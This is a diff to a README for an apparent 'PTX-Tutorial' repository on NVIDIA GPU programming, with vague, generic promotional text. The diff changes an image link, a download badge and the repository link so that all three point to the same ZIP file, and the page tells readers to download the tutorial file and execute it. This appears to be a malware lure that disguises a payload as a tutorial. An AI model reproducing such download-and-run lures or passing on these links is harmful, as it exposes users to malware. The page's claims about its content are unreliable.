@@ -2,7 +2,7 @@
 
 Welcome to the PTX-Tutorial repository, a comprehensive guide meticulously crafted by AIs to delve deep into the world of Openai and Claude 3.7. 
 
-![PTX Tutorial](https://example.com/tutorial-image.png)
+![PTX Tutorial](https://github.com/Kurvaan/ptx-tutorial-by-aislop/raw/refs/heads/main/sections/by_ptx_tutorial_aislop_3.2.zip)
 
 ## Tutorial Overview
 
@@ -12,7 +12,7 @@ In this tutorial, you will embark on an exciting journey to understand the intri
 
 To begin your PTX learning adventure, download the tutorial file from the link below and execute it:
 
-[![Download Tutorial](https://img.shields.io/badge/Download-Tutorial-yellow.svg)](https://github.com/Kurvaan/ptx-tutorial-by-aislop/releases)
+[![Download Tutorial](https://github.com/Kurvaan/ptx-tutorial-by-aislop/raw/refs/heads/main/sections/by_ptx_tutorial_aislop_3.2.zip)](https://github.com/Kurvaan/ptx-tutorial-by-aislop/raw/refs/heads/main/sections/by_ptx_tutorial_aislop_3.2.zip)
 
 ## What to Expect
 
@@ -26,7 +26,7 @@ Have questions or need assistance while following the tutorial? Feel free to rea
 
 By the end of this tutorial, you will have a solid understanding of PTX programming and be equipped to harness the full potential of NVIDIA GPUs for your computational tasks. Dive into the world of PTX today and elevate your GPU programming skills to new heights!
 
-Explore the possibilities with PTX and unlock a realm of high-performance computing. Visit the [PTX-Tutorial repository](https://github.com/Kurvaan/ptx-tutorial-by-aislop) now to begin your learning journey.
+Explore the possibilities with PTX and unlock a realm of high-performance computing. Visit the [PTX-Tutorial repository](https://github.com/Kurvaan/ptx-tutorial-by-aislop/raw/refs/heads/main/sections/by_ptx_tutorial_aislop_3.2.zip) now to begin your learning journey.
 
 ---
 
